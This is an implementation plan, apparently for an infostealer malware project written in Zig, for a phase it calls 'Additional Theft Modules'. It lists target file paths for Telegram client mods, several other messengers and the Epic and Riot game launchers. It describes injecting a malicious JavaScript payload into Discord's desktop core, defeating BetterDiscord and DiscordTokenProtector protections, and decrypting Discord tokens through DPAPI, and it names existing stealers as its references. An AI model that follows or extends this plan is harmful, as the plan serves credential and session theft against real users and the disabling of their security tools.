# Phase 11: Additional Theft Modules — Implementation Plan

**Цель:** Telegram моды, новые мессенджеры, Discord инжект, Epic+Riot Games.
**Всего задач:** 16 | **Оценка:** ~4 дня | **Сложность:** Средняя

---

## 11.1 Telegram моды (5 задач, ~1 день)

### Текущее состояние
`messengers/telegram.zig` собирает tdata только из `%APPDATA%\Telegram Desktop\tdata`.

### Что делаем
Создаём `messengers/telegram_mods.zig` — сбор tdata из 20+ модов.

**Пути (из SentinelStealer + research):**
| Клиент | Путь (%APPDATA%) | Процесс |
|--------|------------------|---------|
| Telegram Desktop | `\Telegram Desktop\tdata` | Telegram.exe |
| AyuGram | `\AyuGram Desktop\tdata` | AyuGram.exe |
| 64Gram | `\64Gram Desktop\tdata` | 64Gram.exe |
| Catogram | `\Catogram\tdata` | Catogram.exe |
| Kotatogram | `\Kotatogram\tdata` | Kotatogram.exe |
| Nekogram | `\Nekogram\tdata` | Nekogram.exe |
| Forkgram | `\Forkgram\tdata` | Forkgram.exe |
| Unigram (Win32) | `\Unigram\tdata` | Unigram.exe |
| Unigram (UWP) | `%LOCALAPPDATA%\Packages\TelegramMessengerLLP...\LocalCache\Roaming\Telegram Desktop UWP\tdata` | — |
| iMe | `\iMe\tdata` | iMe.exe |

**Метод сбора:** Копировать tdata по тем же правилам что и существующий `telegram.zig` (17-char файлы, key_datas, usertag/settings/configs/maps).

**Referencе:** `SentinelStealer\Recovery\Services\Messengers\TelegramClient.cs`

**Файлы:**
- `src/messengers/telegram_mods.zig` — новый
- `src/messengers/messengers.zig` — добавить вызов telegram_mods

---

## 11.2 Дополнительные мессенджеры (6 задач, ~2 дня)

### Session (`messengers/session.zig`)
- **Путь:** `%APPDATA%\Session`
- **Цель:** config.json, sql\db.sqlite, Local Storage\leveldb
- **Detect:** Directory.exists(%APPDATA%\Session)

### Tox/uTox (`messengers/tox.zig`)
- **Путь:** `%APPDATA%\Tox`
- **Цель:** *.tox (profile files), *.ini (config), *.dat (data)
- **Referencе:** ferrox\src\app\messaging.rs, Stealerium\Tox.cs

### Skype (`messengers/skype.zig`)
- **Путь:** `%APPDATA%\Microsoft\Skype for Desktop`
- **Цель:** Local Storage\leveldb
- **Referencе:** Stealerium\Skype.cs, PhantomStealer\Skype.cs

### Viber (`messengers/viber.zig`)
- **Путь:** `%APPDATA%\ViberPC`
- **Цель:** *.db, *.sqlite, viber.db
- **Referencе:** ferrox\src\app\messaging.rs

### Element (`messengers/element.zig`)
- **Путь:** `%APPDATA%\Element`
- **Цель:** Local Storage\leveldb, IndexedDB, *.db
- **Referencе:** Stealerium\Element.cs, PhantomStealer\Element.cs

### WhatsApp (`messengers/whatsapp.zig`)
- **Путь:** `%LOCALAPPDATA%\WhatsApp`
- **Цель:** LocalStorage, IndexedDB, *.db
- **Referencе:** ferrox\src\app\messaging.rs

---

## 11.3 Discord Injection (4 задачи, ~1.5 дня)

### discord_inject.zig — JS injection
**Referencе:** `skuld\modules\discordinjection\injection.go`

**Алгоритм:**
1. Поиск `%LOCALAPPDATA%\discord\app-*\modules\discord_desktop_core-*\discord_desktop_core\index.js`
2. Аналогично для discordcanary, discordptb, discorddevelopment
3. Скачать malicious JS payload (или встроить простой)
4. Заменить index.js

### BetterDiscord bypass
**Referencе:** skuld injection.go (BypassBetterDiscord)
1. Открыть `%APPDATA%\BetterDiscord\data\betterdiscord.asar`
2. Заменить `"api/webhooks"` на `"ByHackirby"` — ломает webhook'и BD

### TokenProtector bypass
**Referencе:** skuld injection.go (BypassTokenProtector)
1. Убить процесс DiscordTokenProtector
2. Удалить: ProtectionPayload.dll, secure.dat
3. Переписать config.json — отключить все проверки

### Discord — MFA + encrypted tokens (discord.zig improvement)
**Добавить в существующий discord.zig:**
- Пути: discordcanary (canary), discordptb (ptb), discorddevelopment, Lightcord
- MFA токены: уже есть (mfa. prefix)
- Encrypted tokens: расшифровка через DPAPI (как skuld Method B)

---

## 11.4 Gaming (2 задачи, ~1 день)

### Epic Games Store (`gaming/epic.zig`)
**Referencе:** ferrox\src\fun\games\gepic.rs, skuld\modules\games\games.go

**Пути:**
- `%LOCALAPPDATA%\EpicGamesLauncher\Saved\Config\Windows\GameUserSettings.ini`
- `%APPDATA%\EpicGamesLauncher`
- `%PROGRAMDATA%\Epic\EpicGamesLauncher`

**Цель:** GameUserSettings.ini (содержит RememberMe auth), Saved\Config\Windows\*

### Riot Games (`gaming/riot.zig`)
**Referencе:** ferrox\src\fun\games\griot.rs (233 строки), skuld\modules\games\games.go

**Пути:**
- `%LOCALAPPDATA%\Riot Games\Riot Client\Config` — RiotClientSettings.yaml, RiotClientPrivateSettings.yaml
- `%LOCALAPPDATA%\Riot Games\Riot Client\Data`
- `%LOCALAPPDATA%\VALORANT`
- `%APPDATA%\VALORANT`
- `%LOCALAPPDATA%\Riot Games\League of Legends`
- `%APPDATA%\Riot Games\League of Legends`

**Цель:** YAML конфиги с auth токенами, установленные игры

---

## Execution Order

```
Day 1: Telegram mods + Session + Tox
Day 2: Skype + Viber + Element + WhatsApp
Day 3: Discord injection + bypasses + MFA tokens
Day 4: Epic + Riot games + integration + tests
```

## Files Summary

### Новые файлы (10):
| File | Референс в raw/ |
|------|-----------------|
| `messengers/telegram_mods.zig` | SentinelStealer TelegramClient.cs |
| `messengers/session.zig` | — (новый) |
| `messengers/tox.zig` | ferrox messaging.rs |
| `messengers/skype.zig` | Stealerium Skype.cs |
| `messengers/viber.zig` | ferrox messaging.rs |
| `messengers/element.zig` | Stealerium Element.cs |
| `messengers/whatsapp.zig` | ferrox messaging.rs |
| `messengers/discord_inject.zig` | skuld discordinjection/ |
| `gaming/epic.zig` | ferrox gepic.rs |
| `gaming/riot.zig` | ferrox griot.rs |

### Модифицируемые файлы (3):
| File | Изменения |
|------|-----------|
| `messengers/discord.zig` | +canary/ptb/dev paths, +encrypted tokens |
| `messengers/messengers.zig` | +telegram_mods, session, tox, skype, viber, element, whatsapp |
| `gaming/gaming.zig` | +epic, riot |
